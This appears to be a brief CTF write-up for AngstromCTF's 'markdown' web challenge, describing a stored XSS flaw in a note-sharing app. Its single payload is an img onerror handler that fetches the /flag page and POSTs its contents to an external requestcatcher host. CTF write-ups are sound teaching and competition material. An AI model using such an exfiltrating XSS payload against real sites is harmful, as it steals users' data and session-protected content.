<font size = '4'>
<p align = 'center'>
<b>
AngstromCTF - markdown Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

My friend made an app for sharing their notes!

App: https://markdown.web.actf.co/

Send them a link: https://admin-bot.actf.co/markdown

index.js

<br>

<b>Exploitation:</b><br>

The app is vulnerable to stored XSS.

Payload used:
```html
<img src=x onerror="fetch('https://markdown.web.actf.co/flag').then(response => console.log(response.status) || response).then(response => response.text()).then(body => fetch('https://mishajain123.requestcatcher.com',{method:'POST',body:body}))">
```
